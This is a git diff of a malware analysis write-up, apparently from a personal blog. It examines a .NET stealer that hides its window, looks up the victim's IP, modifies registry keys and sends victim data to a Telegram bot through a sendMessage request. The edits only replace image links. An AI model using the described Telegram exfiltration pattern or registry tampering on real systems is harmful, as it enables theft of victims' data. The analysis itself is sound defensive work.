@@ -18,28 +18,32 @@ SHA256: D60BB69DA27799D822608902C59373611C18920C77887DE7489D289EBF2BD53E
 - At VirusTotal.com, 40 out of 69 engines for AV detection mark the software as malicious.
 
 
-![Alt text](image.png)
+![image](https://github.com/it4ch1-007/it4ch1-007.github.io/assets/133276365/7d73a746-3200-4d93-ac1e-67d33c5ea518)
+
 
 ### CFF explorer
 
 - I ran CFF explorer on the executable file to find that it is a .NET framework executable.
 
-![Alt text](image-1.png)
+![image](https://github.com/it4ch1-007/it4ch1-007.github.io/assets/133276365/8bc7edb1-de5a-44a4-954e-9ff3da4866a1)
+
 
 - Let's fire it up inside a VM and see its activity:
 
 ### ProcMonitor
 
-![Alt text](image-2.png)  
+![image](https://github.com/it4ch1-007/it4ch1-007.github.io/assets/133276365/b575b129-fbe0-4d09-893d-e59b1268a39a)
+
 
 ### Task Manager
 
-![Alt text](image-7.png)
+![image](https://github.com/it4ch1-007/it4ch1-007.github.io/assets/133276365/a3ede584-3498-4e9e-9a90-f0b36f6746b0)
+
 
 - I used dnSpy 32-bit version to decompile the executable file to get the csharp code of the file.
 
 
-![Alt text](image-3.png)
+![image](https://github.com/it4ch1-007/it4ch1-007.github.io/assets/133276365/3c81944c-e0a4-4688-9f6e-661c7dc0ca9a)
 
 - First of all , the malware is as usual trying to hide itself from the user hiding its window as well as not making itself visible on the taskbar using:
 
@@ -56,11 +60,11 @@ http://icanhazip.com
 ```
 - I sent requests to this server only to get an IP-Address: 
 
-![Alt text](image-4.png)
+![image](https://github.com/it4ch1-007/it4ch1-007.github.io/assets/133276365/be853dec-71f6-4f31-96eb-ac9ed9393d4d)
 
 - This function is trying to access the windows registry keys and modifying them
 
-![Alt text](image-8.png)
+![image](https://github.com/it4ch1-007/it4ch1-007.github.io/assets/133276365/94e661d0-d342-4a33-bc8a-0365b9939811)
 
 - Registry keys acessed and modified to:
 
@@ -71,11 +75,11 @@ SOFTWARE\WOW6432Node\Clients\StartMenuInternet =>SOFTWARE\Clients\StartMenuInter
 
 - The malware is sending a `GET` request to the host: `https://api.telegram.org/bot/sendMessage?chat_id=<chat_id>&text=<Victim's_Data>`
 
-![Alt text](image-9.png)
+![image](https://github.com/it4ch1-007/it4ch1-007.github.io/assets/133276365/5850ca25-5a7e-4e77-9310-f3a250889837)
 
 - The malware also tries to capture the keyboard and display control using SQL Queries inside the Registy Key Editor:
 
-![Alt text](image-12.png)
+![image](https://github.com/it4ch1-007/it4ch1-007.github.io/assets/133276365/f24b3a77-31b8-450e-ba91-ca12859ef4b8)
 
 The base64 string decodes to :
 
@@ -88,7 +92,8 @@ Select * from Win32_Keyboard
 http://ipinfo.io/ip
 ```
 
-![Alt text](image-10.png)
+![image](https://github.com/it4ch1-007/it4ch1-007.github.io/assets/133276365/202f669c-ad95-4e94-bd51-da6ba4da1de4)
+
 
 and is splitting and trimming all the data received by it to get the data in raw format.
 - The data received at this host address is another IP-Address:
@@ -98,7 +103,7 @@ and is splitting and trimming all the data received by it to get the data in raw
 ```
 - The function `fn_check_activity` checks all the results of the functions trying to get the info about the victim's system and use `SQLite.Interop.dll` for this.
 
-![Alt text](image-11.png)
+![image](https://github.com/it4ch1-007/it4ch1-007.github.io/assets/133276365/454671f9-a40f-433e-aa4d-a9500a47f1fb)
 
 - It tries to find some strings inside the Registry Keys Editor in Windows system in order to modify them in favour of the attacker:
 
@@ -120,7 +125,8 @@ V2UgYXJlIHN0aWxsIGFjdGl2ZSB1bnRpbCB2aWN0aW1lIHNodXRzIGRvd24h : {We are still act
 https://api.telegram.org/bot
 ` and try to give a form of data to a telegram bot.
 
-![Alt text](image-5.png)
+![image](https://github.com/it4ch1-007/it4ch1-007.github.io/assets/133276365/58af3d36-8014-465c-a51b-1dcbe48ec761)
+
 
 - However if the chat_id is not known.
 
@@ -129,7 +135,7 @@ https://api.telegram.org/bot
 ```
 - The malware is using FNV hashing algorithm to hash the strings inside the malware 
 
-![Alt text](image-6.png)
+![image](https://github.com/it4ch1-007/it4ch1-007.github.io/assets/133276365/ffc44b73-8677-4c85-bf3d-0e0d04a0699e)
 
 - This string is added to access the updates as got by the bot from the web server where the bot is working: `https://api.telegram.org/bot/getUpdates`
 
